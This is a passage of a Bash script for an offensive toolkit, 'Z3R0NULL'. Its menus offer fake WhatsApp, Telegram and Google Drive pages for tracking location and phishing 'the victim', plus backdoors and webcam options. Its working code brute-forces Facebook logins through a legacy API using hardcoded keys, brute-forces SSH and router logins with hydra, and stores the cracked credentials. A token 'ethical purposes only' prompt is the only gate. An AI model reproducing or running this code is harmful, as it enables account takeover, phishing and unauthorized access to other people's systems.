#Ethical Purposes Only? (Y/N)
yesorno(){
    tput cnorm
    clear
    banner
    echo -e "${orangebold}[${reset}*${orangebold}] ETHICAL PURPOSES ONLY?${reset} ${whitebold}(Y/N)${reset}" | pv -qL 20
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' yesorno

    if [[ ${yesorno} == "Y" ]] || [[ ${yesorno} == "y" ]];then
    main_menu
    elif [[ ${yesorno} == "N" ]] || [[ ${yesorno} == "n" ]];then
    clear
    banner
    exit
    else
    clear
    banner
    error_404
    sleep 1
    yesorno
    fi
}

#Main Menu
main_menu(){
    clear
    banner
    echo -e "${bluebold}[* MENU *]${reset}"
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] Location${reset}"
    echo -e "${bluebold}[${reset}02${bluebold}] Phishing${reset}"
    echo -e "${bluebold}[${reset}03${bluebold}] BruteForce${reset}"
    echo -e "${bluebold}[${reset}04${bluebold}] Backdoors${reset}"
    echo -e "${bluebold}[${reset}05${bluebold}] Clipboard${reset}"
    echo -e "${bluebold}[${reset}06${bluebold}] Network${reset}"
    echo -e "${bluebold}[${reset}07${bluebold}] WebCam${reset}"
    echo -e "${bluebold}[${reset}08${bluebold}] Servers${reset}"
    echo -e "${bluebold}[${reset}09${bluebold}] Virus Scan${reset}"
    echo -e "${bluebold}[${reset}10${bluebold}] HideLink${reset}"
    echo -e "${bluebold}[${reset}11${bluebold}] FTPServer${reset}"
    echo -e "${bluebold}[${reset}12${bluebold}] Pages${reset}"
    echo -e "${bluebold}[${reset}13${bluebold}] Osint${reset}"
#    echo -e "${bluebold}[${reset}14${bluebold}] XX${reset}"
#    echo -e "${bluebold}[${reset}15${bluebold}] XX${reset}"
    echo -e "${bluebold}[${reset}99${bluebold}] Full Update System${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] EXIT${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' main_menu

    if [[ ${main_menu} == "01" ]] || [[ ${main_menu} == "1" ]];then
    location_menu
    elif [[ ${main_menu} == "02" ]] || [[ ${main_menu} == "2" ]];then
    phishing_menu
    elif [[ ${main_menu} == "03" ]] || [[ ${main_menu} == "3" ]];then
    bruteforce_menu
    elif [[ ${main_menu} == "04" ]] || [[ ${main_menu} == "4" ]];then
    backdoors_menu
    elif [[ ${main_menu} == "05" ]] || [[ ${main_menu} == "5" ]];then
    clipboard_menu
    elif [[ ${main_menu} == "06" ]] || [[ ${main_menu} == "6" ]];then
    network_menu
    elif [[ ${main_menu} == "07" ]] || [[ ${main_menu} == "7" ]];then
    webcam_menu
    elif [[ ${main_menu} == "08" ]] || [[ ${main_menu} == "8" ]];then
    server_select
    elif [[ ${main_menu} == "09" ]] || [[ ${main_menu} == "9" ]];then
    virus_scan_menu
    elif [[ ${main_menu} == "10" ]] || [[ ${main_menu} == "10" ]];then
    hide_link_menu
    elif [[ ${main_menu} == "11" ]] || [[ ${main_menu} == "11" ]];then
    site="ftp"
    select_server
    elif [[ ${main_menu} == "12" ]] || [[ ${main_menu} == "12" ]];then
    pages_menu
    elif [[ ${main_menu} == "13" ]] || [[ ${main_menu} == "13" ]];then
    osint_menu
    elif [[ ${main_menu} == "14" ]] || [[ ${main_menu} == "14" ]];then
    :
    elif [[ ${main_menu} == "15" ]] || [[ ${main_menu} == "15" ]];then
    :
    elif [[ ${main_menu} == "99" ]] || [[ ${main_menu} == "99" ]];then
    system_update
    elif [[ ${main_menu} == "00" ]] || [[ ${main_menu} == "0" ]];then
    exit_script
    else
    clear
    banner
    error_404
    sleep 1
    main_menu
    fi
}

#Select Location Site Template
location_menu(){
    clear
    banner
    echo -e "${bluebold}[* SELECT SITE *]${reset}"
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] Whatsapp${reset}"
    echo -e "${bluebold}[${reset}02${bluebold}] Telegram${reset}"
    echo -e "${bluebold}[${reset}03${bluebold}] GoogleDrive${reset}"
    echo -e "${bluebold}[${reset}04${bluebold}] NearYou${reset}"
    echo -e "${bluebold}[${reset}05${bluebold}] Custom Redirect${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] BACK${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' location_menu

    if [[ ${location_menu} == "01" ]] || [[ ${location_menu} == "1" ]];then
    site="location/whatsapp"
    location_whatsapp
    elif [[ ${location_menu} == "02" ]] || [[ ${location_menu} == "2" ]];then
    site="location/telegram"
    location_telegram
    elif [[ ${location_menu} == "03" ]] || [[ ${location_menu} == "3" ]];then
    site="location/googledrive"
    location_googledrive
    elif [[ ${location_menu} == "04" ]] || [[ ${location_menu} == "4" ]];then
    site="location/nearyou"
    select_server
    elif [[ ${location_menu} == "05" ]] || [[ ${location_menu} == "5" ]];then
    site="location/redirect"
    location_redirect
    elif [[ ${location_menu} == "00" ]] || [[ ${location_menu} == "0" ]];then
    main_menu
    else
    clear
    banner
    error_404
    sleep 1
    location_menu
    fi
}

#Edit Whatsapp Template
location_whatsapp(){
    clear
    banner
    echo -e "${bluebold}[* WHATSAPP *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Enter group title.${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' location_whatsapp_title

    clear
    banner
    echo -e "${bluebold}[* WHATSAPP *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Enter group icon directory. (300x300)${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' location_whatsapp_img

    IMG=$(basename ${location_whatsapp_img})
    cp ${location_whatsapp_img} ${script_dir}/.sites/${site}/images/
    cd ${script_dir}/.sites/${site}/ || exit_script
    sleep 1
    sed 's+CUSTOM_TITLE+'${location_whatsapp_title}'+g; s+CUSTOM_ICON+'images/${IMG}'+g' index_temp.html > index.html
    sleep 0.5
    cd ${script_dir}/ || exit_script
    select_server
}

#Edit Telegram Template
location_telegram(){
    clear
    banner
    echo -e "${bluebold}[* TELEGRAM *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Enter group title.${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' location_telegram_title

    clear
    banner
    echo -e "${bluebold}[* TELEGRAM *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Enter group description.${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' location_telegram_description

    clear
    banner
    echo -e "${bluebold}[* TELEGRAM *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Enter group icon directory. (300x300)${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' location_telegram_img

    clear
    banner
    echo -e "${bluebold}[* TELEGRAM *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Enter the number of group members.${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' location_telegram_members

    clear
    banner
    echo -e "${bluebold}[* TELEGRAM *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Enter the number of group members online.${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' location_telegram_online_members

    IMG=$(basename ${location_telegram_img})
    cp ${location_telegram_img} ${script_dir}/.sites/${site}/images/
    cd ${script_dir}/.sites/${site}/ || exit_script
    sleep 1
    sed 's+CUSTOM_TITLE+'${location_telegram_title}'+g; s+CUSTOM_DESC+'${location_telegram_description}'+g' index_temp.html > index_temp_02.html
    sleep 1
    sed 's+CUSTOM_ICON+'images/${IMG}'+g; s+CUSTOM_MEMBERS+'${location_telegram_members}'+g; s+CUSTOM_ONLINE+'${location_telegram_online_members}'+g' index_temp_02.html > index.html
    cd ${script_dir}/ || exit_script
    select_server
}

#Edit Google Drive Template
location_googledrive(){
    clear
    banner
    echo -e "${bluebold}[* GOOGLE DRIVE *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Enter the link to redirect the victim.${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' location_googledrive_url

    cd ${script_dir}/.sites/${site}/js/ || exit_script
    sleep 1
    sed 's+CUSTOM_URL+'${location_googledrive_url}'+g' location_temp.js > location.js
    cd ${script_dir}/ || exit_script
    select_server
}

location_redirect(){
    clear
    banner
    echo -e "${bluebold}[* CUSTOM REDIRECT *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Enter the link to redirect the victim.${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' location_redirect

    cd ${script_dir}/.sites/${site} || exit_script
    sleep 1
    sed 's+CUSTOM_URL+'${location_redirect}'+g' index_template.php > index.php 
    cd ${script_dir}/ || exit_script
    select_server
}

#Select Phishing Site Template
phishing_menu(){
    clear
    banner
    echo -e "${bluebold}[* SELECT SITE *]${reset}"
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] Whatsapp${reset}"
    echo -e "${bluebold}[${reset}02${bluebold}] Telegram${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] BACK${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' phishing_menu

    if [[ ${phishing_menu} == "01" ]] || [[ ${phishing_menu} == "1" ]];then
    site="phishing/whatsapp"
    select_server
    elif [[ ${phishing_menu} == "02" ]] || [[ ${phishing_menu} == "2" ]];then
    site="phishing/telegram"
    select_server
    elif [[ ${phishing_menu} == "00" ]] || [[ ${phishing_menu} == "0" ]];then
    main_menu
    else
    clear
    banner
    error_404
    sleep 1
    phishing_menu
    fi
}

#Brute Force Select
bruteforce_menu(){
    clear
    banner
    echo -e "${bluebold}[* SELECT OPTION *]${reset}"
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] Facebook${reset}"
    echo -e "${bluebold}[${reset}02${bluebold}] SSH${reset}"
    echo -e "${bluebold}[${reset}99${bluebold}] Router${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] BACK${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' bruteforce_menu

    if [[ ${bruteforce_menu} == "1" ]] || [[ ${bruteforce_menu} == "01" ]];then
    bruteforce_facebook
    elif [[ ${bruteforce_menu} == "2" ]] || [[ ${bruteforce_menu} == "02" ]];then
    bruteforce_ssh
    elif [[ ${bruteforce_menu} == "99" ]] || [[ ${bruteforce_menu} == "99" ]];then
    bruteforce_router
    elif [[ ${bruteforce_menu} == "0" ]] || [[ ${bruteforce_menu} == "00" ]];then
    main_menu
    else
    clear
    banner
    error_404
    sleep 1
    bruteforce_menu
    fi
}

#Facebook Brute Force
bruteforce_facebook(){
    API_KEY_FB="62f8ce9f74b12f84c123cc23437a4a32"

    clear
    banner
    echo -e "${bluebold}[* FACEBOOK *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Enter ID/PHONE/EMAIL/USERNAME.${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' bruteforce_facebook_user
    
    clear
    banner
    echo -e "${bluebold}[* FACEBOOK *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Enter passwords wordlist directory.${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' bruteforce_facebook_wordlist

    BRUTEFORCE_WORDLIST=$(cat ${bruteforce_facebook_wordlist} | tr '\n' ' ')

    start_time=$(date +%s)

    for bruteforce_facebook_password in ${BRUTEFORCE_WORDLIST}
         do
             clear
             banner
             echo -e "${bluebold}[* FACEBOOK *]${reset}"
             echo -e ""
             echo -e "${greenbold}[${reset}*${greenbold}] User -->${reset} ${whitebold}${bruteforce_facebook_user}${reset}"
             echo -e "${greenbold}[${reset}*${greenbold}] Trying password -->${reset} ${whitebold}${bruteforce_facebook_password}${reset}"
             SIGFB="api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=${bruteforce_facebook_user}format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=${bruteforce_facebook_password}return_ssl_resources=0v=1.0${API_KEY_FB}"
             MD5FB=$(echo -n "${SIGFB}" | md5sum | grep -o "[0-9a-z]\+")
             DATAFB="api_key=882a8490361da98702bf97a021ddc14d&credentials_type=password&email=${bruteforce_facebook_user}&format=JSON&generate_machine_id=1&generate_session_cookies=1&locale=en_US&method=auth.login&password=${bruteforce_facebook_password}&return_ssl_resources=0&v=1.0&sig=${MD5FB}"
             CHECK_FB=$(curl -s "https://api.facebook.com/restserver.php?${DATAFB}" | grep -o "session_key")
             if [[ ${CHECK_FB} == *session_key* ]];then
             bruteforce_facebook_password_found
             end_time=$(date +%s)
             elapsed_time=$((end_time - start_time))
             fi
         done
    bruteforce_facebook_password_not_found
}

#Password Found FB Brute
bruteforce_facebook_password_found(){
    bruteforce_facebook_save="
    [*] NEW ACCOUNT FB [*]
    [*] User: ${bruteforce_facebook_user}
    [*] Password: ${bruteforce_facebook_password}"
    echo "${bruteforce_facebook_save}" >> "${script_dir}/DATA/INFORMATION"
    
    clear
    banner
    echo -e "${bluebold}[* FACEBOOK *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Elapsed Time -->${reset} ${whitebold}${elapsed_time}${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] User -->${reset} ${whitebold}${bruteforce_facebook_user}${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Password found -->${reset} ${whitebold}${bruteforce_facebook_password}${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Saved in -->${reset} ${whitebold}${script_dir}/DATA/INFORMATION${reset}"
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] MENU${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] EXIT${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' bruteforce_facebook_password_found

    if [[ ${bruteforce_facebook_password_found} == "01" ]] || [[ ${bruteforce_facebook_password_found} == "1" ]];then
    main_menu
    elif [[ ${bruteforce_facebook_password_found} == "00" ]] || [[ ${bruteforce_facebook_password_found} == "0" ]];then
    exit_script
    else
    clear
    banner
    error_404
    sleep 1
    bruteforce_facebook_password_found
    fi
}

#Error Password Not Found FB Brute
bruteforce_facebook_password_not_found(){
    clear
    banner
    echo -e "${bluebold}[* FACEBOOK *]${reset}"
    echo -e ""
    echo -e "${orangebold}[${reset}*${orangebold}] Password not found in -->${reset} ${whitebold}${bruteforce_facebook_wordlist}${reset}"
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] MENU${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] EXIT${reset}"
    echo -e "" 
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' bruteforce_facebook_password_not_found

    if [[ ${bruteforce_facebook_password_not_found} == "01" ]] || [[ ${bruteforce_facebook_password_not_found} == "1" ]];then
    main_menu
    elif [[ ${bruteforce_facebook_password_not_found} == "00" ]] || [[ ${bruteforce_facebook_password_not_found} == "0" ]];then
    exit_script
    else
    clear
    banner
    error_404
    sleep 1
    bruteforce_facebook_password_not_found
    fi
}

#
bruteforce_ssh(){
    clear
    banner
    echo -e "${bluebold}[* SSH *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Enter users wordlist directory.${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' bruteforce_ssh_users_list

    clear
    banner
    echo -e "${bluebold}[* SSH *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Enter passwords wordlist directory.${reset}"
    echo -e ""
    echo -e "${orangebold}[${reset}*${orangebold}] Users List -->${reset} ${whitebold}${bruteforce_ssh_users_list}${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' bruteforce_ssh_passwords_list

    clear
    banner
    echo -e "${bluebold}[* SSH *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Enter IP.${reset}"
    echo -e ""
    echo -e "${orangebold}[${reset}*${orangebold}] Users List -->${reset} ${whitebold}${bruteforce_ssh_users_list}${reset}"
    echo -e "${orangebold}[${reset}*${orangebold}] Pass List  -->${reset} ${whitebold}${bruteforce_ssh_passwords_list}${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' bruteforce_ssh_ip

    bruteforce_ssh_continue
}

#Continue Router Bruteforce?
bruteforce_ssh_continue(){
    clear
    banner
    echo -e "${bluebold}[* SSH *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Continue?${reset}"
    echo -e ""
    echo -e "${orangebold}[${reset}*${orangebold}] Users List -->${reset} ${whitebold}${bruteforce_ssh_users_list}${reset}"
    echo -e "${orangebold}[${reset}*${orangebold}] Pass List  -->${reset} ${whitebold}${bruteforce_ssh_passwords_list}${reset}"
    echo -e "${orangebold}[${reset}*${orangebold}] IP -->${reset} ${whitebold}${bruteforce_ssh_ip}${reset}"
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] ATTACK${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] EDIT${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' bruteforce_ssh_continue

    if [[ ${bruteforce_ssh_continue} == "01" ]] || [[ ${bruteforce_ssh_continue} == "1" ]];then
    bruteforce_ssh_start
    elif [[ ${bruteforce_ssh_continue} == "00" ]] || [[ ${bruteforce_ssh_continue} == "0" ]];then
    bruteforce_ssh
    else
    clear
    banner
    error_404
    sleep 1
    bruteforce_ssh_continue
    fi
}

#Start Router Bruteforce
bruteforce_ssh_start(){
    bruteforce_ssh_users=$(cat ${bruteforce_ssh_users_list} | tr '\n' ' ')
    bruteforce_ssh_passwords=$(cat ${bruteforce_ssh_passwords_list} | tr '\n' ' ')
    start_time=$(date +%s)

    for bruteforce_ssh_user_check in ${bruteforce_ssh_users};do
        for bruteforce_ssh_pass_check in ${bruteforce_ssh_passwords};do
            clear
            banner
            echo -e "${bluebold}[* SSH *]${reset}"
            echo -e ""
            echo -e "${greenbold}[${reset}*${greenbold}] Trying user -->${reset} ${whitebold}${bruteforce_ssh_user_check}${reset}"
            echo -e "${greenbold}[${reset}*${greenbold}] Trying password -->${reset} ${whitebold}${bruteforce_ssh_pass_check}${reset}"

            CHECK_SSH=$(hydra -l ${bruteforce_ssh_user_check} -p ${bruteforce_ssh_pass_check} ${bruteforce_ssh_ip} ssh)

            if [[ ${CHECK_SSH} == *"1 valid password found"* ]];then
            end_time=$(date +%s)
            elapsed_time=$((end_time - start_time))
            bruteforce_ssh_found
            fi
        done
    done
    bruteforce_ssh_not_found
}

#Password Found Router Brute
bruteforce_ssh_found(){
    rm -rf ${script_dir}/.files/hydra.restore
    bruteforce_ssh_save="
    [*] NEW SSH CREDENTIALS [*]
    [*] User: ${bruteforce_ssh_user_check}
    [*] Password: ${bruteforce_ssh_pass_check}"
    echo "${bruteforce_ssh_save}" >> "${script_dir}/DATA/INFORMATION"
    
    clear
    banner
    echo -e "${bluebold}[* SSH *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Elapsed Time -->${reset} ${whitebold}${elapsed_time}${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] User found -->${reset} ${whitebold}${bruteforce_ssh_user_check}${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Password found -->${reset} ${whitebold}${bruteforce_ssh_pass_check}${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Saved in -->${reset} ${whitebold}${script_dir}/DATA/INFORMATION${reset}"
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] MENU${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] EXIT${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' bruteforce_ssh_found

    if [[ ${bruteforce_ssh_found} == "01" ]] || [[ ${bruteforce_ssh_found} == "1" ]];then
    main_menu
    elif [[ ${bruteforce_ssh_found} == "00" ]] || [[ ${bruteforce_ssh_found} == "0" ]];then
    exit_script
    else
    clear
    banner
    error_404
    sleep 1
    bruteforce_ssh_found
    fi
}

#Error Password Not Found FB Brute
bruteforce_ssh_not_found(){
    rm -rf ${script_dir}/.files/hydra.restore
    clear
    banner
    echo -e "${bluebold}[* SSH *]${reset}"
    echo -e ""
    echo -e "${orangebold}[${reset}*${orangebold}] Credentials user or password not found in -->${reset} ${whitebold}${bruteforce_ssh_users_list} & ${bruteforce_ssh_passwords_list}${reset}"
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] MENU${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] EXIT${reset}"
    echo -e "" 
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' bruteforce_ssh_not_found

    if [[ ${bruteforce_ssh_not_found} == "01" ]] || [[ ${bruteforce_ssh_not_found} == "1" ]];then
    main_menu
    elif [[ ${bruteforce_ssh_not_found} == "00" ]] || [[ ${bruteforce_ssh_not_found} == "0" ]];then
    exit_script
    else
    clear
    banner
    error_404
    sleep 1
    bruteforce_ssh_not_found
    fi
}

#Router Brute Force
bruteforce_router(){
    clear
    banner
    echo -e "${bluebold}[* ROUTER *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Enter users wordlist directory.${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' bruteforce_router_users_list

    clear
    banner
    echo -e "${bluebold}[* ROUTER *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Enter passwords wordlist directory.${reset}"
    echo -e ""
    echo -e "${orangebold}[${reset}*${orangebold}] Users List -->${reset} ${whitebold}${bruteforce_router_users_list}${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' bruteforce_router_passwords_list

    clear
    banner
    echo -e "${bluebold}[* ROUTER *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Enter router IP.${reset}"
    echo -e ""
    echo -e "${orangebold}[${reset}*${orangebold}] Users List -->${reset} ${whitebold}${bruteforce_router_users_list}${reset}"
    echo -e "${orangebold}[${reset}*${orangebold}] Pass List  -->${reset} ${whitebold}${bruteforce_router_passwords_list}${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' bruteforce_router_ip

    bruteforce_router_service
}

#Router Select Service
bruteforce_router_service(){
    clear
    banner
    echo -e "${bluebold}[* ROUTER *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Select service.${reset}"
    echo -e ""
    echo -e "${orangebold}[${reset}*${orangebold}] Users List -->${reset} ${whitebold}${bruteforce_router_users_list}${reset}"
    echo -e "${orangebold}[${reset}*${orangebold}] Pass List  -->${reset} ${whitebold}${bruteforce_router_passwords_list}${reset}"
    echo -e "${orangebold}[${reset}*${orangebold}] IP -->${reset} ${whitebold}${bruteforce_router_ip}${reset}"
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] HTTPS-GET${reset}"
    echo -e "${bluebold}[${reset}02${bluebold}] HTTP-GET${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] BACK${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' bruteforce_router_service

    if [[ ${bruteforce_router_service} == "01" ]] || [[ ${bruteforce_router_service} == "1" ]];then
    router_service="https-get"
    bruteforce_router_continue
    elif [[ ${bruteforce_router_service} == "02" ]] || [[ ${bruteforce_router_service} == "2" ]];then
    router_service="http-get"
    bruteforce_router_continue
    elif [[ ${bruteforce_router_service} == "00" ]] || [[ ${bruteforce_router_service} == "0" ]];then
    main_menu
    else
    clear
    banner
    error_404
    sleep 1
    bruteforce_router_service
    fi
}

#Continue Router Bruteforce?
bruteforce_router_continue(){
    clear
    banner
    echo -e "${bluebold}[* ROUTER *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Continue?${reset}"
    echo -e ""
    echo -e "${orangebold}[${reset}*${orangebold}] Users List -->${reset} ${whitebold}${bruteforce_router_users_list}${reset}"
    echo -e "${orangebold}[${reset}*${orangebold}] Pass List  -->${reset} ${whitebold}${bruteforce_router_passwords_list}${reset}"
    echo -e "${orangebold}[${reset}*${orangebold}] IP -->${reset} ${whitebold}${bruteforce_router_ip}${reset}"
    echo -e "${orangebold}[${reset}*${orangebold}] Service -->${reset} ${whitebold}${router_service}${reset}"
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] ATTACK${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] EDIT${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' bruteforce_router_continue

    if [[ ${bruteforce_router_continue} == "01" ]] || [[ ${bruteforce_router_continue} == "1" ]];then
    bruteforce_router_start
    elif [[ ${bruteforce_router_continue} == "00" ]] || [[ ${bruteforce_router_continue} == "0" ]];then
    bruteforce_router
    else
    clear
    banner
    error_404
    sleep 1
    bruteforce_router_continue
    fi
}

#Start Router Bruteforce
bruteforce_router_start(){
    bruteforce_router_users=$(cat ${bruteforce_router_users_list} | tr '\n' ' ')
    bruteforce_router_passwords=$(cat ${bruteforce_router_passwords_list} | tr '\n' ' ')
    start_time=$(date +%s)
    for bruteforce_router_user_check in ${bruteforce_router_users};do
        for bruteforce_router_pass_check in ${bruteforce_router_passwords};do
            clear
            banner
            echo -e "${bluebold}[* ROUTER *]${reset}"
            echo -e ""
            echo -e "${greenbold}[${reset}*${greenbold}] Trying user -->${reset} ${whitebold}${bruteforce_router_user_check}${reset}"
            echo -e "${greenbold}[${reset}*${greenbold}] Trying password -->${reset} ${whitebold}${bruteforce_router_pass_check}${reset}"

            CHECK_RT=$(hydra -l ${bruteforce_router_user_check} -p ${bruteforce_router_pass_check} -e ns -f -V ${bruteforce_router_ip} ${bruteforce_router_service})

            if [[ ${CHECK_RT} == *"1 valid password found"* ]];then
            bruteforce_router_found
            end_time=$(date +%s)
            elapsed_time=$((end_time - start_time))
            fi
        done
    done
    bruteforce_router_not_found
}

#Password Found Router Brute
bruteforce_router_found(){
    rm -rf ${script_dir}/.files/hydra.restore
    bruteforce_router_save="
    [*] NEW ROUTER CREDENTIALS [*]
    [*] User: ${bruteforce_router_user_check}
    [*] Password: ${bruteforce_router_pass_check}"
    echo "${bruteforce_router_save}" >> "${script_dir}/DATA/INFORMATION"
    
    clear
    banner
    echo -e "${bluebold}[* ROUTER *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Elapsed Time -->${reset} ${whitebold}${elapsed_time}${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] User found -->${reset} ${whitebold}${bruteforce_router_user_check}${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Password found -->${reset} ${whitebold}${bruteforce_router_pass_check}${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Saved in -->${reset} ${whitebold}${script_dir}/DATA/INFORMATION${reset}"
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] MENU${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] EXIT${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' bruteforce_router_found

    if [[ ${bruteforce_router_found} == "01" ]] || [[ ${bruteforce_router_found} == "1" ]];then
    main_menu
    elif [[ ${bruteforce_router_found} == "00" ]] || [[ ${bruteforce_router_found} == "0" ]];then
    exit_script
    else
    clear
    banner
    error_404
    sleep 1
    bruteforce_router_found
    fi
}

#Error Password Not Found FB Brute
bruteforce_router_not_found(){
    rm -rf ${script_dir}/.files/hydra.restore
    clear
    banner
    echo -e "${bluebold}[* ROUTER *]${reset}"
    echo -e ""
    echo -e "${orangebold}[${reset}*${orangebold}] Credentials user or password not found in -->${reset} ${whitebold}${bruteforce_router_users_list} & ${bruteforce_router_passwords_list}${reset}"
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] MENU${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] EXIT${reset}"
    echo -e "" 
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' bruteforce_router_not_found

    if [[ ${bruteforce_router_not_found} == "01" ]] || [[ ${bruteforce_router_not_found} == "1" ]];then
    main_menu
    elif [[ ${bruteforce_router_not_found} == "00" ]] || [[ ${bruteforce_router_not_found} == "0" ]];then
    exit_script
    else
    clear
    banner
    error_404
    sleep 1
    bruteforce_router_not_found
    fi
}

#Backdoors Menu
backdoors_menu(){
    clear
    banner
    echo -e "${bluebold}[* SELECT OPTION *]${reset}"
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] Android${reset}"
    echo -e "${bluebold}[${reset}02${bluebold}] Windows${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] BACK${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' backdoors_menu

    if [[ ${backdoors_menu} == "01" ]] || [[ ${backdoors_menu} == "1" ]];then
    backdoor_payload_type="android"
    backdoor_android
